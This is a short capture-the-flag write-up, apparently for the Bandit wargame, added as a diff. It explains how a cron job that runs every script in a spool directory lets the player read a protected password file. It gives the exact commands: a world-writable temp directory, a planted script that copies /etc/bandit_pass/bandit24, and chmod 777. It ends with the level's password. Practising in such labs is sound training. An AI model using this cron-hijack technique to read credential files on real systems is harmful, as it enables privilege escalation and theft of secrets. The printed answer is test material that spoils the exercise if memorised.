@@ -1,0 +1,25 @@
+A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+In this level we have to look up the script that is running on cronjob_bandit24 and we can see that it is executing all scripts in the /var/spool/bandit24/foo/ directory
+from there we can create our own script to fetch the password from /etc/bandit_pass/bandit24 and skip to the next level
+DONT FORGET TO GIVE PERMS! LOL
+
+
+cat /etc/cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+
+mktemp -d
+chmod 777 /tmp/tmp.VbSB9lB4F3/
+
+vim /var/spool/bandit24/foo/password.sh
+
+#!/bin/bash
+
+cat /etc/bandit_pass/bandit24 > /tmp/tmp.VbSB9lB4F3/password
+
+chmod 777 /var/spool/bandit24/foo/password.sh
+
+cat /tmp/tmp.VbSB9lB4F3/password
+
+password:
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
